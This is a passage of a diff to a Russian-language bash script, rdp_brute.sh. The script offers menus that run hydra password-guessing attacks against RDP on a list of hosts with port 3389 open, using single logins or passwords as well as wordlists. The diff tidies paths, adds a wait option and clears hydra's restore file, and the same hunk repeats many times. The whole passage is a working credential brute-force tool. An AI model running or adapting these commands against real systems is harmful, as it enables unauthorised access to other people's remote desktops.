 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3547,7 +3727,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3556,7 +3736,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3585,6 +3765,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -3596,7 +3780,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3606,7 +3790,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3616,7 +3800,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3625,7 +3809,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3654,6 +3838,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -3665,7 +3853,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3675,7 +3863,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3685,7 +3873,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3694,7 +3882,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3723,6 +3911,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -3734,7 +3926,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3744,7 +3936,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3754,7 +3946,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3763,7 +3955,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3792,6 +3984,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -3803,7 +3999,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3813,7 +4009,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3823,7 +4019,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3832,7 +4028,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3861,6 +4057,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -3872,7 +4072,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3882,7 +4082,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3892,7 +4092,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3901,7 +4101,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3930,6 +4130,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -3941,7 +4145,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3951,7 +4155,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3961,7 +4165,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3970,7 +4174,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -3999,6 +4203,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -4010,7 +4218,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4020,7 +4228,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4030,7 +4238,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4039,7 +4247,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4068,6 +4276,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -4079,7 +4291,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4089,7 +4301,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4099,7 +4311,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4108,7 +4320,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4137,6 +4349,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -4148,7 +4364,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4158,7 +4374,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4168,7 +4384,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4177,7 +4393,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4206,6 +4422,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -4217,7 +4437,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4227,7 +4447,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4237,7 +4457,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4246,7 +4466,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4275,6 +4495,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -4286,7 +4510,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4296,7 +4520,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4306,7 +4530,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4315,7 +4539,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4344,6 +4568,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -4355,7 +4583,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4365,7 +4593,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -4375,7 +4603,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
